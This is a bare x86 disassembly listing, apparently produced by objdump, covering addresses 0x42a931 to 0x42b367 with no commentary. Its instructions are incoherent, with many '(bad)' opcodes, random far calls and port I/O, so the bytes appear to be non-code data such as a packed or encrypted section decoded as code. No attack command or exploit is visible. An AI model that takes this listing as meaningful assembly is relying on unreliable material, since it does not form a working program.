  42a931:	aaa    
  42a932:	or     eax,0x1cf02bc8
  42a937:	or     eax,0x7a37eb66
  42a93c:	bound  esi,QWORD PTR [esi+0x18]
  42a93f:	lahf   
  42a940:	jne    0x42a91b
  42a942:	lods   al,BYTE PTR ds:[esi]
  42a943:	cmp    BYTE PTR [edx*2+0x2af17064],dl
  42a94a:	(bad)  [edx-0x3c9259da]
  42a950:	add    al,0x76
  42a952:	imul   esp,DWORD PTR ss:[eax+ebp*1+0x1f0e4c76],0xffffffd7
  42a95b:	jl     0x42a982
  42a95d:	dec    ebx
  42a95e:	mov    al,ds:0x4a04d6cb
  42a963:	or     DWORD PTR [edx+0x30b86211],0x6f
  42a96a:	lea    ebp,[eax+0x63e12075]
  42a970:	cdq    
  42a971:	shr    DWORD PTR [edi-0x5],1
  42a974:	(bad)  
  42a975:	aaa    
  42a976:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a977:	fimul  DWORD PTR [ebx]
  42a979:	(bad)
  42a97c:	mov    esi,0x61cff368
  42a981:	jb     0x42a9d6
  42a983:	fdiv   DWORD PTR [eax+0x13]
  42a986:	test   al,0x66
  42a988:	(bad)  
  42a98a:	lahf   
  42a98b:	sbb    ebp,edi
  42a98d:	cdq    
  42a98e:	lock add eax,DWORD PTR [eax]
	...
  42a9f1:	add    BYTE PTR [eax],al
  42a9f3:	add    BYTE PTR [eax+0x3fee1d93],ch
  42a9f9:	out    dx,al
  42a9fa:	sti    
  42a9fb:	xlat   BYTE PTR ds:[ebx]
  42a9fc:	in     eax,0xd3
  42a9fe:	aad    0x7
  42aa00:	repz xlat BYTE PTR ds:[ebx]
  42aa02:	(bad)  
  42aa03:	fsub   DWORD PTR [edi+eax*8+0x1040001]
  42aa0a:	add    BYTE PTR [eax],al
  42aa0c:	cs es push 0xffffffb7
  42aa10:	daa    
  42aa11:	int3   
  42aa12:	mov    al,0x5a
  42aa14:	aas    
  42aa15:	mov    BYTE PTR [eax+0x55],bh
  42aa18:	cwde   
  42aa19:	cmc    
  42aa1a:	mov    bh,ch
  42aa1c:	out    dx,al
  42aa1d:	and    eax,edi
  42aa1f:	or     cl,BYTE PTR [edx+eax*2+0x70]
  42aa23:	sahf   
  42aa24:	dec    ebp
  42aa25:	inc    ebp
  42aa26:	aam    0x4f
  42aa28:	or     ebp,DWORD PTR [edi+0x4b4cf4ee]
  42aa2e:	sbb    eax,0x368c9fe1
  42aa33:	adc    DWORD PTR [ecx],ebp
  42aa35:	mov    ds:0xd5b30d21,eax
  42aa3a:	mov    ecx,0x7954a6d8
  42aa3f:	push   eax
  42aa40:	inc    esi
  42aa41:	cmc    
  42aa42:	inc    esi
  42aa43:	dec    ebx
  42aa44:	jnp    0x42aaba
  42aa46:	mov    ebx,0x9afd1b05
  42aa4b:	sbb    al,0x9f
  42aa4d:	pop    ebp
  42aa4e:	and    BYTE PTR [eax-0x7b67c771],dh
  42aa54:	or     eax,DWORD PTR [esi]
  42aa56:	lea    ebp,[ebx]
  42aa58:	pop    ds
  42aa59:	and    DWORD PTR ds:[edx+0x54a4b9ed],ebp
  42aa60:	adc    dl,cl
  42aa62:	out    0x36,al
  42aa64:	mov    edx,0xc7c70836
  42aa69:	jle    0x42aa31
  42aa6b:	mov    esi,0x11e44406
  42aa70:	push   cs
  42aa71:	inc    esp
  42aa72:	sub    ecx,ebp
  42aa74:	in     eax,dx
  42aa75:	test   al,0xb1
  42aa77:	leave  
  42aa78:	jl     0x42aaa1
  42aa7a:	lahf   
  42aa7b:	sbb    esi,DWORD PTR [ebx+0x63e7f7e9]
  42aa81:	popf   
  42aa82:	stc    
  42aa83:	cmp    ch,BYTE PTR [eax-0x15]
  42aa86:	imul   edi,DWORD PTR [ecx+0x4c47898b],0xc96532f1
  42aa90:	fadd   QWORD PTR [edi-0x69]
  42aa93:	call   0x2951:0xa3a1e0c6
  42aa9a:	enter  0xe1f6,0x7d
  42aa9e:	adc    edi,esi
  42aaa0:	ins    BYTE PTR es:[edi],dx
  42aaa1:	outs   dx,DWORD PTR ds:[esi]
  42aaa2:	mov    ss,WORD PTR [ebx+0x23]
  42aaa5:	push   ss
  42aaa6:	push   cs
  42aaa7:	dec    eax
  42aaa8:	clc    
  42aaa9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42aaaa:	cmp    BYTE PTR [edx+0x8],0x48
  42aaae:	(bad)  
  42aaaf:	sbb    dh,BYTE PTR [eax+0x62]
  42aab2:	mov    al,0xcc
  42aab4:	ins    DWORD PTR es:[edi],dx
  42aab5:	add    esp,DWORD PTR [eax+0x53]
  42aab8:	xor    DWORD PTR [esi],edx
  42aaba:	and    cl,BYTE PTR [edi]
  42aabc:	aad    0x60
  42aabe:	call   0x842876b3
  42aac3:	xchg   DWORD PTR [ebp+ebx*1-0x54],edi
  42aac7:	fisub  WORD PTR [edx+0x199aa657]
  42aacd:	retf   
  42aace:	(bad)  
  42aacf:	jl     0x42ab33
  42aad1:	sbb    ch,BYTE PTR [esp+esi*4]
  42aad4:	push   cs
  42aad5:	mov    bl,0x17
  42aad7:	jle    0x42aaab
  42aad9:	sub    BYTE PTR [edx+esi*4],ah
  42aadc:	jb     0x42aa88
  42aade:	(bad)  
  42aadf:	jmp    0xaf67:0xadca91f6
  42aae6:	sub    bl,BYTE PTR [eax+0x4a4c5e0]
  42aaec:	pop    esp
  42aaed:	inc    ecx
  42aaee:	std    
  42aaef:	mov    ah,0x98
  42aaf1:	mov    bh,0xda
  42aaf3:	pusha  
  42aaf4:	push   es
  42aaf5:	jnp    0x42ab01
  42aaf7:	pop    es
  42aaf8:	cmp    cl,BYTE PTR [eax]
  42aafa:	sbb    BYTE PTR [ebp-0x27],bh
  42aafd:	outs   dx,BYTE PTR ds:[esi]
  42aafe:	dec    ebx
  42aaff:	mov    ch,0x8a
  42ab01:	or     ah,BYTE PTR [eax+ebx*8+0x7f]
  42ab05:	dec    ecx
  42ab06:	fimul  DWORD PTR [ecx]
  42ab08:	pop    edi
  42ab09:	popf   
  42ab0a:	or     DWORD PTR [ecx-0x5e861432],0x0
	...
  42ab71:	add    BYTE PTR [eax],al
  42ab73:	add    BYTE PTR [esi],bh
  42ab75:	push   cs
  42ab76:	sub    al,0x5d
  42ab78:	cmp    al,0x7f
  42ab7a:	jg     0x42abeb
  42ab7c:	and    BYTE PTR [eax],cl
  42ab7e:	mov    dl,0x43
  42ab80:	mov    bl,0x3c
  42ab82:	push   ebx
  42ab83:	adc    ebp,DWORD PTR [eax+0x40001c8]
  42ab89:	add    DWORD PTR [eax],eax
  42ab8b:	add    cl,dh
  42ab8d:	dec    ebp
  42ab8e:	pop    ebx
  42ab8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ab90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ab91:	jmp    0x88a5dcdb
  42ab96:	inc    ecx
  42ab97:	call   0xed040c61
  42ab9c:	dec    esi
  42ab9d:	and    eax,DWORD PTR [edi+0x1da3e8db]
  42aba3:	sbb    BYTE PTR [ebp+0x6c],ch
  42aba6:	(bad)  
  42aba8:	test   al,0xc4
  42abaa:	inc    esp
  42abab:	in     al,dx
  42abac:	jle    0x42ab8b
  42abae:	sbb    eax,0x4db4cbb9
  42abb3:	dec    esi
  42abb4:	(bad)  
  42abb5:	cmp    edi,DWORD PTR [ecx+0x3addad4b]
  42abbb:	and    eax,0xc4102b4d
  42abc0:	mov    bh,0x9c
  42abc2:	gs inc ebp
  42abc4:	inc    ecx
  42abc5:	(bad)  
  42abc6:	mov    ebp,0xcc8ec3c0
  42abcb:	mov    ss,eax
  42abcd:	sbb    al,0x5b
  42abcf:	adc    BYTE PTR [esi+ebx*8+0x1e8a6ac2],dh
  42abd6:	push   eax
  42abd7:	lock (bad) 
  42abda:	loop   0x42ab5e
  42abdc:	sub    DWORD PTR [edi+0x7fec4243],ecx
  42abe2:	sub    al,0xea
  42abe4:	cmp    al,0xe1
  42abe6:	push   ecx
  42abe7:	icebp  
  42abe8:	and    ch,dh
  42abea:	mov    ecx,0x76533c77
  42abef:	sub    al,0x85
  42abf1:	sub    BYTE PTR [edx-0x36af056e],cl
  42abf7:	pushf  
  42abf8:	inc    ebx
  42abf9:	push   cs
  42abfa:	pop    edx
  42abfb:	repz test esi,ebx
  42abfe:	add    eax,0xa1f65f81
  42ac03:	fcomp  QWORD PTR [ebx]
  42ac05:	aaa    
  42ac06:	inc    esi
  42ac07:	and    esp,ecx
  42ac09:	retf   
  42ac0a:	cmp    eax,esp
  42ac0c:	inc    eax
  42ac0d:	into   
  42ac0e:	adc    dl,ah
  42ac10:	ss test eax,0x3b7b0b11
  42ac16:	scas   eax,DWORD PTR es:[edi]
  42ac17:	push   edi
  42ac18:	push   esi
  42ac19:	iret   
  42ac1a:	shl    BYTE PTR [ecx],0xa6
  42ac1d:	das    
  42ac1e:	pop    ds
  42ac1f:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  42ac21:	dec    edi
  42ac22:	pusha  
  42ac23:	push   cs
  42ac24:	jle    0x42abc8
  42ac26:	in     eax,0xc7
  42ac28:	ret    0x9a75
  42ac2b:	sbb    al,BYTE PTR [ecx]
  42ac2d:	js     0x42ac48
  42ac2f:	repnz cmp esp,DWORD PTR [esi+0x28]
  42ac33:	and    eax,0xe3766da3
  42ac38:	leave  
  42ac39:	mov    ecx,0x8f84a17e
  42ac3e:	sbb    DWORD PTR [esi-0x17e011df],esi
  42ac44:	adc    esi,ebp
  42ac46:	mov    dl,BYTE PTR [eax+0x7630bc1d]
  42ac4c:	into   
  42ac4d:	fadd   DWORD PTR [ebx-0x72]
  42ac50:	sub    BYTE PTR [edi+0x1a],cl
  42ac53:	pop    edi
  42ac54:	pop    ebp
  42ac55:	or     bl,BYTE PTR [ebx-0x34]
  42ac58:	pop    ebp
  42ac59:	xor    DWORD PTR [esi],0x5021223b
  42ac5f:	aas    
  42ac60:	call   0xc85a:0x4daeacd4
  42ac67:	push   esi
  42ac68:	cs call 0x4ec4:0x9cf4868d
  42ac70:	pusha  
  42ac71:	outs   dx,BYTE PTR ds:[esi]
  42ac72:	das    
  42ac73:	sbb    al,0x90
  42ac75:	(bad)
  42ac79:	dec    ecx
  42ac7a:	and    al,0x9c
  42ac7c:	cmp    edi,0xffffffa5
  42ac7f:	inc    ebx
  42ac80:	out    0x80,al
  42ac82:	mov    ?,WORD PTR [ebp-0x2b34d6b8]
  42ac88:	lods   al,BYTE PTR ds:[esi]
  42ac89:	test   eax,0x6bb5719f
  42ac8e:	push   ss
  42ac8f:	hlt    
	...
  42acf4:	jmp    0xdf7cc92b
  42acf9:	ds out dx,eax
  42acfb:	repz ret 
  42acfd:	fcom   DWORD PTR [edx+0x72]
  42ad00:	test   dh,cl
  42ad02:	not    BYTE PTR [edx-0x54]
  42ad05:	leave  
  42ad06:	add    DWORD PTR [eax],eax
  42ad08:	add    al,0x1
  42ad0a:	add    BYTE PTR [eax],al
  42ad0c:	push   esi
  42ad0d:	rcr    DWORD PTR [ebx],1
  42ad0f:	and    al,0x4d
  42ad11:	push   0x13023421
  42ad16:	pop    ecx
  42ad17:	(bad)  
  42ad19:	push   edi
  42ad1a:	mov    ah,0xff
  42ad1c:	push   esp
  42ad1d:	data16 icebp 
  42ad1f:	dec    esp
  42ad20:	aaa    
  42ad21:	xchg   ebx,eax
  42ad22:	mov    dh,0x53
  42ad24:	fs xchg esp,eax
  42ad26:	jne    0x42acfa
  42ad28:	xor    DWORD PTR [ebx-0x44],esi
  42ad2b:	addr16 push ebx
  42ad2d:	push   cs
  42ad2e:	adc    bh,BYTE PTR [eax-0x71c7f109]
  42ad34:	loopne 0x42acca
  42ad36:	lea    ecx,[edi+0x245f88f6]
  42ad3c:	ror    DWORD PTR [eax],1
  42ad3e:	mov    ch,0xdf
  42ad40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ad41:	push   esi
  42ad42:	inc    ebp
  42ad43:	in     al,0x9
  42ad45:	les    esi,FWORD PTR [ebx-0x166e149b]
  42ad4b:	mov    al,0xf0
  42ad4d:	push   ds
  42ad4e:	and    eax,0xe6f55bb8
  42ad53:	add    ax,0x50af
  42ad57:	xchg   esp,eax
  42ad58:	stos   BYTE PTR es:[edi],al
  42ad59:	idiv   DWORD PTR [ebp-0x3d]
  42ad5c:	jmp    0x5c208166
  42ad61:	fistp  WORD PTR [esi+esi*1]
  42ad64:	and    ebx,DWORD PTR [edx+0x42edf5c2]
  42ad6a:	nop
  42ad6b:	stos   DWORD PTR es:[edi],eax
  42ad6c:	push   ebx
  42ad6d:	adc    BYTE PTR ds:0x5964cfd3,ah
  42ad73:	pop    ecx
  42ad74:	sti    
  42ad75:	popf   
  42ad76:	xor    al,0xfb
  42ad78:	or     edx,ecx
  42ad7a:	sub    al,0x1
  42ad7c:	xor    eax,0xfb250104
  42ad81:	xchg   edi,eax
  42ad82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ad83:	dec    edi
  42ad84:	mov    edi,0xda6f1808
  42ad89:	mov    eax,ds:0x6a5abd8b
  42ad8e:	mov    BYTE PTR [ecx+0x3b4a1ab9],0x1d
  42ad95:	(bad)  
  42ad96:	lahf   
  42ad97:	mov    ch,0x7c
  42ad99:	inc    esi
  42ad9a:	aas    
  42ad9b:	push   ecx
  42ad9c:	mov    ds:0x1dac03ea,eax
  42ada1:	jmp    0x22b6:0x797f16c1
  42ada8:	pop    esi
  42ada9:	mov    dh,0xe8
  42adab:	mov    ds:0x71fba554,eax
  42adb0:	xor    eax,0x3b73c007
  42adb5:	mov    edx,eax
  42adb7:	call   0x366e6f69
  42adbc:	jb     0x42adf2
  42adbe:	stos   DWORD PTR es:[edi],eax
  42adbf:	xchg   ebx,eax
  42adc0:	outs   dx,BYTE PTR ds:[esi]
  42adc1:	mov    esp,0x37018802
  42adc6:	mov    ebx,0xcafaf25e
  42adcb:	push   ds
  42adcc:	fmul   QWORD PTR [edi]
  42adce:	or     al,0x6
  42add0:	mov    cl,BYTE PTR [eax-0x7f]
  42add3:	ss or  ch,ah
  42add6:	mov    edi,0x9c8e8f64
  42addb:	jge    0x42ae35
  42addd:	ins    BYTE PTR es:[edi],dx
  42adde:	xchg   ecx,eax
  42addf:	jnp    0x42ae55
  42ade1:	sub    ebx,DWORD PTR [edx]
  42ade3:	pop    ss
  42ade4:	sbb    al,0x9
  42ade6:	inc    edx
  42ade7:	mov    ebx,0x42a8cf88
  42adec:	push   eax
  42aded:	je     0x42adea
  42adef:	xor    ah,BYTE PTR [ecx+0x7a]
  42adf2:	mov    dh,bl
  42adf4:	cld    
  42adf5:	mov    dh,0x8f
  42adf7:	popf   
  42adf8:	fcomp  DWORD PTR [ecx+0x30]
  42adfb:	pop    eax
  42adfd:	and    al,0x81
  42adff:	aam    0x93
  42ae01:	ins    BYTE PTR es:[edi],dx
  42ae02:	gs mov bh,0xdd
  42ae05:	add    al,0x76
  42ae07:	mov    ebx,0xfb33d04
  42ae0c:	hlt    
  42ae0d:	jl     0x42ae32
  42ae0f:	push   es
	...
  42ae74:	mov    edi,0x4a8e4af7
  42ae79:	mov    edi,0x7bd8f7ff
  42ae7e:	mov    dh,0xb9
  42ae80:	repz sub eax,0xcab08131
  42ae86:	add    DWORD PTR [eax],eax
  42ae88:	add    al,0x1
  42ae8a:	add    BYTE PTR [eax],al
  42ae8c:	cwde   
  42ae8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ae8e:	aaa    
  42ae8f:	xor    eax,0x493ded71
  42ae94:	pop    ds
  42ae95:	fwait
  42ae96:	pshufw mm1,mm7,0x2e
  42ae9a:	push   edi
  42ae9b:	dec    esi
  42ae9c:	mov    ecx,0x88abe35d
  42aea1:	jle    0x42aef8
  42aea3:	jo     0x42ae80
  42aea5:	sub    DWORD PTR [edx],0xffffffb8
  42aea8:	xor    eax,0x17fef46d
  42aead:	dec    edx
  42aeae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42aeaf:	mov    ebx,0x8cf76c50
  42aeb4:	pop    es
  42aeb5:	inc    ecx
  42aeb6:	add    eax,0x62f1f2bc
  42aebb:	data16 xor dh,BYTE PTR [eax+0x35]
  42aebf:	xor    edi,DWORD PTR [eax+0x41555694]
  42aec5:	loopne 0x42aea0
  42aec7:	std    
  42aec8:	push   ecx
  42aec9:	data16 repnz jecxz 0x42af22
  42aecd:	jge    0x42ae9c
  42aecf:	shr    DWORD PTR [esi+0x243b45a4],0x42
  42aed6:	mov    ds:0x8e4b0791,al
  42aedb:	int    0x9f
  42aedd:	leave  
  42aede:	repnz pop ds
  42aee0:	outs   dx,DWORD PTR ds:[esi]
  42aee1:	mov    eax,0x8f415b54
  42aee6:	bound  ebx,QWORD PTR [edi-0x565e0a72]
  42aeec:	sahf   
  42aeed:	xor    BYTE PTR [edi],bl
  42aeef:	enter  0xb5d9,0x46
  42aef3:	xchg   esi,eax
  42aef4:	(bad)  
  42aef5:	pusha  
  42aef6:	pop    ds
  42aef7:	sbb    cl,BYTE PTR [esi-0x703debdb]
  42aefd:	retf   
  42aefe:	xchg   edi,eax
  42aeff:	lods   eax,DWORD PTR ds:[esi]
  42af00:	rol    BYTE PTR [ebx-0x23e1e96d],cl
  42af06:	call   0x6b3f:0xe4bc922a
  42af0d:	adc    DWORD PTR [edx],ebx
  42af0f:	pop    ds
  42af10:	push   0xb60f7776
  42af15:	enter  0x1e27,0xef
  42af19:	sub    eax,0xefdf9e50
  42af1e:	add    eax,0x295721b2
  42af23:	mov    cs,WORD PTR [edx-0x19]
  42af26:	inc    ecx
  42af27:	shr    BYTE PTR [esi-0x35f301d8],1
  42af2d:	retf   
  42af2e:	sbb    dl,BYTE PTR [ebp-0x4d232b4c]
  42af34:	cmp    esp,DWORD PTR [edx-0x29f114a5]
  42af3a:	pop    esp
  42af3b:	sbb    ecx,edi
  42af3d:	dec    ebp
  42af3e:	mov    edi,0x39758f3b
  42af43:	(bad)  
  42af44:	cmp    DWORD PTR [edi+0x6e],ebp
  42af47:	dec    ebx
  42af48:	push   edi
  42af49:	sbb    DWORD PTR [edi],0xd8b210da
  42af4f:	mov    WORD PTR ds:0xc7a84e51,ss
  42af55:	(bad)  
  42af56:	lock xchg esi,eax
  42af58:	test   DWORD PTR [esi+0x47],0x4b0acb9a
  42af5f:	mov    DWORD PTR [ecx-0x28],ebp
  42af62:	adc    esp,ebx
  42af64:	loop   0x42af6a
  42af66:	pop    es
  42af67:	push   0x2a255889
  42af6c:	icebp  
  42af6d:	push   esi
  42af6e:	or     eax,0x24a90552
  42af73:	xchg   edi,eax
  42af74:	pop    esp
  42af75:	dec    eax
  42af76:	je     0x42af5a
  42af78:	test   eax,0xc70ea3af
  42af7d:	mov    eax,ds:0xf18f070a
  42af82:	ins    DWORD PTR es:[edi],dx
  42af83:	xor    edx,esp
  42af85:	cwde   
  42af86:	push   es
  42af87:	mov    cs,WORD PTR [eax]
  42af89:	inc    edx
  42af8a:	hlt    
  42af8b:	fucomip st,st(3)
  42af8d:	fwait
  42af8e:	jl     0x42af21
	...
  42aff4:	stc    
  42aff5:	enter  0xdc7a,0x7b
  42aff9:	(bad)  
  42affa:	(bad)  
  42affb:	in     eax,dx
  42affc:	sbb    al,0x4f
  42affe:	push   ebp
  42afff:	inc    esp
  42b000:	mov    al,ds:0xb4df45f4
  42b005:	retf   
  42b006:	add    DWORD PTR [eax],eax
  42b008:	add    al,0x1
  42b00a:	add    BYTE PTR [eax],al
  42b00c:	jne    0x42afe1
  42b00e:	outs   dx,DWORD PTR ds:[esi]
  42b00f:	dec    esi
  42b010:	stos   DWORD PTR es:[edi],eax
  42b011:	mov    ds:0x507858a1,eax
  42b016:	out    dx,al
  42b017:	pop    edx
  42b018:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b019:	aad    0x2b
  42b01b:	ret    0xc1b2
  42b01e:	mov    es,WORD PTR [ecx-0x7e9efa82]
  42b024:	test   BYTE PTR [ebx-0xf],bl
  42b027:	push   ds
  42b028:	mov    ebx,0x2325fe31
  42b02d:	jae    0x42b059
  42b02f:	stc    
  42b030:	ret    
  42b031:	idiv   BYTE PTR [esi]
  42b033:	jnp    0x42afdf
  42b035:	lds    ebx,FWORD PTR [edx+esi*1-0x20848ed8]
  42b03c:	mov    eax,DWORD PTR [eax]
  42b03e:	push   cs
  42b03f:	sub    eax,DWORD PTR [eax]
  42b041:	cdq    
  42b042:	js     0x42b00b
  42b044:	sub    DWORD PTR [ebx-0x63],0x548dc6c1
  42b04b:	dec    esi
  42b04c:	mov    ebx,0xb3a240f2
  42b051:	adc    ebx,ecx
  42b053:	sbb    eax,0x30
  42b056:	jp     0x42b04c
  42b058:	out    dx,eax
  42b059:	nop
  42b05a:	jg     0x42b08e
  42b05c:	dec    esi
  42b05d:	das    
  42b05e:	lods   al,BYTE PTR ds:[esi]
  42b05f:	icebp  
  42b060:	inc    ebp
  42b061:	in     eax,dx
  42b062:	cwde   
  42b063:	inc    ebx
  42b064:	cmp    BYTE PTR [edx],cl
  42b066:	mov    esp,0xf4eeaab8
  42b06b:	inc    edx
  42b06c:	inc    BYTE PTR [edi-0x6af7e0ac]
  42b072:	cmp    edx,DWORD PTR [edx+0x622f2748]
  42b078:	mov    al,ds:0x341910e4
  42b07d:	in     eax,dx
  42b07e:	xor    eax,0x74e114ce
  42b083:	jbe    0x42b00a
  42b085:	xchg   edx,eax
  42b086:	xor    eax,0xa3c4401b
  42b08b:	fcmove st,st(2)
  42b08d:	add    bh,ch
  42b08f:	jmp    0xe2397587
  42b094:	lea    ebx,[edi+esi*1+0x4c19d058]
  42b09b:	pop    es
  42b09c:	cli    
  42b09d:	pop    ebx
  42b09e:	mov    esi,DWORD PTR [ecx+0x38]
  42b0a1:	clc    
  42b0a2:	in     eax,dx
  42b0a3:	sub    edi,eax
  42b0a5:	jmp    0x1e0e53ea
  42b0aa:	mov    bl,0xe6
  42b0ac:	int    0x7d
  42b0ae:	mov    ds:0x637fe866,al
  42b0b3:	push   ebx
  42b0b4:	sub    cl,BYTE PTR [edi]
  42b0b6:	xor    al,0xef
  42b0b8:	mov    edx,0x4dc1e9da
  42b0bd:	xor    DWORD PTR [eax],edi
  42b0bf:	ins    BYTE PTR es:[edi],dx
  42b0c0:	arpl   WORD PTR [edx],cx
  42b0c2:	loope  0x42b08e
  42b0c4:	mov    ebx,edi
  42b0c6:	ins    BYTE PTR es:[edi],dx
  42b0c7:	call   0x7f5d:0x7ef0d2c7
  42b0ce:	mov    ebp,0x11b5ea81
  42b0d3:	stos   BYTE PTR es:[edi],al
  42b0d4:	and    DWORD PTR [ebx],edx
  42b0d6:	imul   eax,DWORD PTR [edi],0xffffff82
  42b0d9:	ret    
  42b0da:	mov    ebp,0xa659eff3
  42b0df:	sub    bh,BYTE PTR [ebp-0x1e]
  42b0e2:	ja     0x42b0f2
  42b0e4:	xchg   edx,eax
  42b0e5:	mov    DWORD PTR [eax+0x42],eax
  42b0e8:	mov    edx,0xd2d8cb62
  42b0ed:	or     BYTE PTR [esi-0xef18975],cl
  42b0f3:	mov    ah,0x33
  42b0f5:	aad    0x55
  42b0f7:	lea    ecx,[ebp-0x60]
  42b0fa:	into   
  42b0fb:	fst    st(3)
  42b0fd:	lahf   
  42b0fe:	mov    ds,ecx
  42b100:	imul   esp,ecx,0x89a7dcc4
  42b106:	xor    DWORD PTR [eax-0x2f],ebp
  42b109:	xchg   esi,eax
  42b10a:	sahf   
  42b10b:	jmp    0x42b13e
  42b10d:	fcomp  QWORD PTR [edx+eax*1+0x0]
	...
  42b171:	add    BYTE PTR [eax],al
  42b173:	add    BYTE PTR [ebp+0x25],dh
  42b176:	imul   ebx,DWORD PTR [edi-0x51]
  42b17a:	cmc    
  42b17b:	call   eax
  42b17d:	inc    ebx
  42b17e:	push   edi
  42b17f:	popa   
  42b180:	je     0x42b1af
  42b182:	and    cl,BYTE PTR [ecx-0x48]
  42b185:	int3   
  42b186:	add    DWORD PTR [eax],eax
  42b188:	add    al,0x1
  42b18a:	add    BYTE PTR [eax],al
  42b18c:	or     al,0xe0
  42b18e:	mov    ds:0xb9f63618,al
  42b193:	pop    ss
  42b194:	rcr    BYTE PTR [eax+0x34d172f3],0xd2
  42b19b:	jns    0x42b1b9
  42b19d:	call   edi
  42b19f:	xor    DWORD PTR [eax-0x19f2dc22],0xffffffa4
  42b1a6:	sbb    eax,0xd7633141
  42b1ab:	js     0x42b1e4
  42b1ad:	imul   esi,DWORD PTR [eax],0xffffffd1
  42b1b0:	add    ebp,ebp
  42b1b2:	xchg   DWORD PTR [edi+0x1a5c36f1],ecx
  42b1b8:	aam    0xc5
  42b1ba:	rcr    dh,cl
  42b1bc:	xor    al,0x53
  42b1be:	mov    ch,0x64
  42b1c0:	rol    edi,1
  42b1c2:	mov    eax,0x2fc7a331
  42b1c7:	cmp    al,0x79
  42b1c9:	pop    ecx
  42b1ca:	shl    BYTE PTR ds:0x47532fab,cl
  42b1d0:	xlat   BYTE PTR ds:[ebx]
  42b1d1:	shl    DWORD PTR ss:[ecx-0x47],1
  42b1d5:	dec    esp
  42b1d6:	mov    esi,0xbe5525c9
  42b1db:	xor    DWORD PTR [esi+0x78],0xaf56046f
  42b1e2:	sub    DWORD PTR [esi],edx
  42b1e4:	ret    0x2406
  42b1e7:	mov    eax,ds:0x88511da8
  42b1ec:	and    al,0xf0
  42b1ee:	ret    
  42b1ef:	mov    dl,0xbb
  42b1f1:	dec    esi
  42b1f2:	mov    ah,0x94
  42b1f4:	aaa    
  42b1f5:	(bad)  
  42b1f6:	lds    ecx,FWORD PTR [eax]
  42b1f8:	scas   eax,DWORD PTR es:[edi]
  42b1f9:	inc    esi
  42b1fa:	call   0x67d5:0xfb6d1f59
  42b201:	mov    esp,0xd172bbd1
  42b206:	and    DWORD PTR [edx-0x26beb01d],edi
  42b20c:	inc    ebx
  42b20d:	pusha  
  42b20e:	jmp    0xcb753048
  42b213:	dec    edi
  42b214:	fnstcw WORD PTR [esi+eiz*4]
  42b217:	mov    dl,0xc8
  42b219:	sub    BYTE PTR [eax+0x1],bl
  42b21c:	iret   
  42b21d:	js     0x42b1e6
  42b21f:	outs   dx,DWORD PTR ds:[esi]
  42b220:	mov    edx,0xcf5f60c6
  42b225:	addr16 jb 0x42b224
  42b228:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b229:	shl    BYTE PTR [esi-0x3ceb42d4],cl
  42b22f:	mov    esi,0x6d985f1
  42b234:	fwait
  42b235:	das    
  42b236:	aam    0xff
  42b238:	sub    DWORD PTR [ecx-0x686e3f8a],eax
  42b23e:	mov    ch,0x15
  42b240:	lods   eax,DWORD PTR ds:[esi]
  42b241:	or     al,0xbd
  42b243:	xchg   esp,eax
  42b244:	sub    BYTE PTR [eax-0x3f5576d6],bh
  42b24a:	jmp    0x42b1f2
  42b24c:	xor    dh,al
  42b24e:	call   0x3ea0:0xa3dabd65
  42b255:	je     0x42b282
  42b257:	cli    
  42b258:	stc    
  42b259:	aam    0x5
  42b25b:	and    BYTE PTR [ebp+0x3de36ebb],al
  42b261:	into   
  42b262:	in     eax,dx
  42b263:	cmp    eax,0x2719ca10
  42b268:	mov    dh,0xf0
  42b26a:	pop    edi
  42b26b:	aad    0xa5
  42b26d:	cwde   
  42b26e:	sbb    eax,0xf69beb4d
  42b273:	pop    ss
  42b274:	(bad)  
  42b275:	int3   
  42b276:	inc    ecx
  42b277:	cmp    DWORD PTR [ebx-0x57],ebx
  42b27a:	imul   ecx,edi,0x238e0dea
  42b280:	cmp    BYTE PTR [ebx],0x42
  42b283:	xchg   esi,eax
  42b284:	pushf  
  42b285:	popf   
  42b286:	or     DWORD PTR ds:0x89162e78,ebp
  42b28c:	jo     0x42b226
  42b28e:	scas   eax,DWORD PTR es:[edi]
  42b28f:	cmp    DWORD PTR [eax],eax
	...
  42b2f1:	add    BYTE PTR [eax],al
  42b2f3:	add    BYTE PTR [ebp-0x449f6672],ah
  42b2f9:	ja     0x42b2f8
  42b2fb:	iret   
  42b2fc:	sub    eax,0xc8738e65
  42b301:	inc    ecx
  42b302:	mov    BYTE PTR [ebx-0x44],dl
  42b305:	int    0x1
  42b307:	add    BYTE PTR [ecx+eax*1],al
  42b30a:	add    BYTE PTR [eax],al
  42b30c:	cmp    al,0x6e
  42b30e:	aam    0xa
  42b310:	xchg   edx,eax
  42b311:	or     BYTE PTR [ecx-0x6b917642],bh
  42b317:	add    dh,ch
  42b319:	sbb    DWORD PTR [edi-0x4eb48cf6],esp
  42b31f:	and    DWORD PTR [ebp+0x3debd0cb],esp
  42b325:	jbe    0x42b38b
  42b327:	loope  0x42b347
  42b329:	stos   DWORD PTR es:[edi],eax
  42b32a:	nop
  42b32b:	imul   BYTE PTR [esi-0x18]
  42b32e:	mov    al,0x36
  42b330:	mov    ch,0xa6
  42b332:	mov    ds:0xd72b03bf,al
  42b337:	out    dx,eax
  42b338:	push   es
  42b339:	mov    bl,0x60
  42b33b:	hlt    
  42b33c:	sub    dh,dh
  42b33e:	mov    ds,WORD PTR [ecx+0x61600388]
  42b344:	pop    edx
  42b345:	sbb    BYTE PTR [ebp+0x722e315c],cl
  42b34b:	ror    ch,1
  42b34d:	dec    edi
  42b34e:	faddp  st(7),st
  42b350:	aaa    
  42b351:	sbb    cl,bl
  42b353:	xor    cl,dh
  42b355:	add    BYTE PTR [ebx],bl
  42b357:	in     al,0x91
  42b359:	lods   al,BYTE PTR ds:[esi]
  42b35a:	loop   0x42b3c9
  42b35c:	lock fcomp DWORD PTR [ebp+0x5b0f839f]
  42b363:	sub    dl,BYTE PTR [edi+edx*1]
  42b366:	dec    edi
  42b367:	int    0x7b
